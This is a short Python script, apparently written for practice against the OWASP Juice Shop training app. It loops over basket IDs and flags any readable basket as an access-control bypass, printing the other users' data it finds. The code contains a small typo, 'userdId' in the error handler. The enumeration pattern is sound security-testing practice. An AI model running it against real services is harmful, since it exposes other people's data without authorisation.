import requests as r
import json
import pprint
from endpoints import juice_shop
from endpoints import headers

class BasketAccessTester:
     
    def __init__(self, base_url, headers):
        self.session = r.Session()
        self.base_url = base_url
        self.headers = headers


    def get_basket_response(self, user_id, timeout = 5):
        try:
            session = r.Session()
            url = f"{self.base_url}{user_id}"
            response = self.session.get(url, headers=self.headers, timeout=timeout)
            return response
        except r.exceptions.RequestException as e:
            print(f"Error accessing basket {userdId}: {e}")
            return None


    def analyze_response(self, user_id, response):
        if response is None:
            return

        print(f"\n{'='*50}")
        print(f"Basket ID: {user_id}")
        print(f"Status Code: {response.status_code}")

        if response.status_code == 200:
            print(f"✓ VULNERABILITY: Accessed control bypass - unauthorized access granted")

            try:
                data = response.json()
                pprint.pprint(data)
            except json.JSONDecodeError:
                print(response.text)
        elif response.status_code == 401:
            print("[SECURE] Access denied as expected")

    def execute_attack(self, start_id = 1, end_id=6):
        print(f"Testing baskets {start_id} to {end_id}")
        for user_id in range(start_id, end_id):
            response = self.get_basket_response(user_id)
            self.analyze_response(user_id, response)
            

if __name__ == "__main__":
    runner = BasketAccessTester(juice_shop["basket"], headers)
    runner.execute_attack()